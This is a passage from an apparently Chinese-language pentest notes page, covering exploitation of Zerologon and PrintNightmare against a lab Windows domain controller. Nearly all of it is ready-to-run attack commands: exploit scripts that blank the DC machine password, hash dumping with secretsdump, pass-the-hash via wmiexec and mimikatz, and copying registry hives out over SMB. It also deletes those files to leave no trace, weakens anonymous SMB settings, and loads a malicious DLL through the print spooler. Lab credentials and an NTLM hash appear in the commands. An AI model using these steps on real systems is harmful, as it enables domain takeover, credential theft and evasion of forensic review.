0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="cve-2020-1472zerologon">CVE-2020-1472（Zerologon）<a href="#cve-2020-1472zerologon" class="hash-link" aria-label="CVE-2020-1472（Zerologon）的直接链接" title="CVE-2020-1472（Zerologon）的直接链接">​</a></h2>
<p>2020年08月11日，Windows官方发布了 NetLogon  特权提升漏洞的风险通告，该漏洞编号为CVE-2020-1472，漏洞等级：严重，漏洞评分：10分，该漏洞也称为“Zerologon”。攻击者在通过NetLogon（MS-NRPC）协议与AD域控建立安全通道时，可利用该漏洞将AD域控的机器账户密码置为空（域控的机器账户默认具有DCSync权限），从而控制域控服务器。</p>
<p><strong>注意： 利用漏洞时会将机器账户的密码置为空，这会导致域控脱离域环境，所以利用成功后，需要快速恢复域控机器用户的原始哈希，防止出现域控无法启动或脱离域的情况。</strong></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞利用1使用github的脚本">漏洞利用1：使用GitHub的脚本<a href="#漏洞利用1使用github的脚本" class="hash-link" aria-label="漏洞利用1：使用GitHub的脚本的直接链接" title="漏洞利用1：使用GitHub的脚本的直接链接">​</a></h3>
<p>使用 <a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener noreferrer">CVE-2020-1472</a> 和 <a href="https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py" target="_blank" rel="noopener noreferrer">zerologon_tester.py</a></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 利用前，可以先用POC探测一下，如果可以打就可以提前为后续的操作做好准备</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># python3 zerologon_tester.py &lt;dc-name&gt; &lt;dc-ip&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 zerologon_tester.py PDC </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.15</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 利用，给密码置空 python3 cve-2020-1472-exploit.py &lt;dc-name&gt; &lt;dc-ip&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 cve-2020-1472-exploit.py PDC </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.15</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20240418下午31848010" src="/assets/images/image-20240418下午31848010-cfc19425572ed51ae162d05cc87a7fa7.png" width="1012" height="400" class="img_ev3q"></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 获取Hash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 /usr/share/doc/python3-impacket/examples/secretsdump.py org.gm7/PDC</span><span class="token punctuation" style="color:#393A34">\</span><span class="token variable" style="color:#36acaa">$@</span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.15 -just-dc -no-pass</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这个时候已经拿到Hash了，需要赶紧还原域控机器账户的密码。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># wmiexec使用域管Hash连进去</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 /usr/share/doc/python3-impacket/examples/wmiexec.py gm7.org/administrator@172.16.93.15 </span><span class="token parameter variable" style="color:#36acaa">-hashes</span><span class="token plain"> :3ac1e294fabedf7d2bfa80fec59f59b9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 导出SAM、SYSTEM和SECURITY</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reg save HKLM</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SYSTEM system.save</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reg save HKLM</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SAM sam.save</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reg save HKLM</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SECURITY security.save</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 移动到sysvol，方便后续下载</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">move *.save </span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">\</span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.15</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">sysvol</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 新开一个终端操作，将这几个文件导出到攻击者本地，我目前想到最简单方便的就是用smbclient了，刚好机器账户的密码被置空了</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">smbclient //172.16.93.15/sysvol </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> PDC$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">get system.save</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">get sam.save</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">get security.save</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 加密，拿到 PDC$ 的Hash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 /usr/share/doc/python3-impacket/examples/secretsdump.py </span><span class="token parameter variable" style="color:#36acaa">-sam</span><span class="token plain"> sam.save </span><span class="token parameter variable" style="color:#36acaa">-system</span><span class="token plain"> system.save </span><span class="token parameter variable" style="color:#36acaa">-security</span><span class="token plain"> security.save LOCAL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 删除刚才导出的几个文件，不留痕迹</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">del /F /S </span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">\</span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.15</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">sysvol</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">*.save</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20240418下午45228806" src="/assets/images/image-20240418下午45228806-10bc15609a3066536de99c1757b12812.png" width="1250" height="848" class="img_ev3q"></p>
<p>还原密码：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 restorepassword.py org.gm7/PDC@PDC -target-ip </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.15 </span><span class="token parameter variable" style="color:#36acaa">-hexpass</span><span class="token plain"> 325d50bdf65c370f217e898a650ff6759a5d8f41a1f8528af97ed4821f0b2ac0657e255453edcfda7bd4dc70ca3a362e5386a16ed5af67db3b457f88af3eed6924c8f4931cff6ea5835bab05bad190787b8ef8c6d93f0a40f461cd5b2702ad88ed3e4626835ebcd949edcf1a017f4262d248612d829c8c8e8b1424632a926f3c9dd8daf1e58699f4d15dcd341f452cbdf392b941edcd88e7e3b355eb4e2431ba2ae0de0e868c8e979f81aed8cd90c65fe6907c724e65ce2f448a5b43bb0b36bd8deaf6c0923f3aa2eb3d06942ee6df386636a929c5f509ff670f42eee9d62de438789e997e79d33cc6c31a5738ccfd5f</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20240418下午35105418" src="/assets/images/image-20240418下午35105418-bec1b06cfbf36fbaab9c070f60958507.png" width="1250" height="234" class="img_ev3q"></p>
<p>再次验证，拿不到hash就说明还原成功了。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 /usr/share/doc/python3-impacket/examples/secretsdump.py org.gm7/PDC</span><span class="token punctuation" style="color:#393A34">\</span><span class="token variable" style="color:#36acaa">$@</span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.15 -just-dc -no-pass</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞利用2使用mimikatz">漏洞利用2：使用mimikatz<a href="#漏洞利用2使用mimikatz" class="hash-link" aria-label="漏洞利用2：使用mimikatz的直接链接" title="漏洞利用2：使用mimikatz的直接链接">​</a></h3>
<p>利用手法都一样，给机器账户的密码置空，然后读hash，最后恢复密码。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 探测</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lsadump::zerologon /target:172.16.93.15 /account:PDC$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 置空密码</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lsadump::zerologon /target:172.16.93.15 /account:PDC$ /exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 拿到Hash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lsadump::dcsync /domain:org.gm7 /dc:PDC.org.gm7 /user:administrator /authuser:PDC$ /authdomain:ORG /authpassword: /authntlm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 启一个域管CMD</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">privilege::debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sekurlsa::pth /user:administrator /domain:org.gm7 /ntlm:3ac1e294fabedf7d2bfa80fec59f59b9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 在域管的CMD运行，恢复密码</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lsadump::postzerologon /target:172.16.93.15 /account:PDC$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p>最后恢复密码恢复的不是原来的，有点奇怪，不确定是不是操作有问题。</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="cve-2021-1675cve-2021-34527printnightmare">CVE-2021-1675/CVE-2021-34527（PrintNightMare）<a href="#cve-2021-1675cve-2021-34527printnightmare" class="hash-link" aria-label="CVE-2021-1675/CVE-2021-34527（PrintNightMare）的直接链接" title="CVE-2021-1675/CVE-2021-34527（PrintNightMare）的直接链接">​</a></h2>
<blockquote>
<p>此漏洞一开始为CVE-2021-1675，随后微软把此漏洞分配给了CVE-2021-34527,并提到了两个漏洞很像，但是攻击向量是不同的。</p>
</blockquote>
<p>Windows Print Spooler是Windows的打印机后台处理程序，广泛的应用于各种内网中，经过身份认证的攻击者可以通过该漏洞绕过 <code>PfcAddPrinterDriver</code> 的安全验证，使 Spooler 服务加载恶意 DLL。若攻击者所控制的用户在域中，则攻击者可以连接到DC中的Spooler服务，并利用该漏洞在DC中安装恶意的驱动程序，完整的控制整个域环境。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="探测">探测<a href="#探测" class="hash-link" aria-label="探测的直接链接" title="探测的直接链接">​</a></h3>
<p>使用impacket的<code>rpcdump.py</code></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">   python3 rpcdump.py @172.16.93.3 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">egrep</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;MS-RPRN|MS-PAR&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 如果有返回结果如下，那么就可能存在漏洞</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Protocol: </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">MS-PAR</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">: Print System Asynchronous Remote Protocol</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Protocol: </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">MS-RPRN</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">: Print System Remote Protocol</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞利用1内网windows">漏洞利用1：内网windows<a href="#漏洞利用1内网windows" class="hash-link" aria-label="漏洞利用1：内网windows的直接链接" title="漏洞利用1：内网windows的直接链接">​</a></h3>
<p>利用3gstudent的<a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer" target="_blank" rel="noopener noreferrer"><code>Invoke-BuildAnonymousSMBServer</code></a>快速搭建匿名SMB服务。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Set-ExecutionPolicy</span><span class="token plain"> Bypass</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Import-Module</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">\</span><span class="token function" style="color:#d73a49">Invoke-BuildAnonymousSMBServer</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 开启匿名SMB</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Invoke-BuildAnonymousSMBServer</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Path c:\windows\temp </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Mode Enable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 关闭匿名SMB</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Invoke-BuildAnonymousSMBServer</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Path c:\windows\temp </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Mode Disable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>也可以手动搭建</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># powershell</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">icacls C:\windows\temp\ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">T </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">grant Anonymous` logon:r</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">icacls C:\windows\temp\ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">T </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">grant Everyone:r</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">New-SmbShare</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Path C:\share </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Name share </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ReadAccess </span><span class="token string" style="color:#e3116c">&#x27;ANONYMOUS LOGON&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;Everyone&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">REG ADD </span><span class="token string" style="color:#e3116c">&quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v NullSessionPipes </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_MULTI_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d srvsvc </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">f </span><span class="token comment" style="color:#999988;font-style:italic">#This will overwrite existing NullSessionPipes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">REG ADD </span><span class="token string" style="color:#e3116c">&quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v NullSessionShares </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_MULTI_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d share </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">REG ADD </span><span class="token string" style="color:#e3116c">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v EveryoneIncludesAnonymous </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_DWORD </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d 1 </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">REG ADD </span><span class="token string" style="color:#e3116c">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v RestrictAnonymous </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_DWORD </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d 0 </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Reboot</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后把恶意的dll放到对应的匿名共享目录</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">cp</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">.dll c:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">temp</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以使用 <a href="https://github.com/cube0x0/CVE-2021-1675" target="_blank" rel="noopener noreferrer">CVE-2021-1675</a> 或者mimikatz进行利用，加载恶意的dll（使用 <a href="https://github.com/cube0x0/CVE-2021-1675" target="_blank" rel="noopener noreferrer">CVE-2021-1675</a> POC进行攻击，需要看文档安装指定版本的impacket。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># CVE-2021-1675 成功率比较高</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 CVE-2021-1675.py org.gm7/d4m1ts:KsadiN8A.as221@172.16.93.15 </span><span class="token string" style="color:#e3116c">&#x27;\\172.16.93.2\smb\1.dll&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># mimikatz 可能会失败</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span 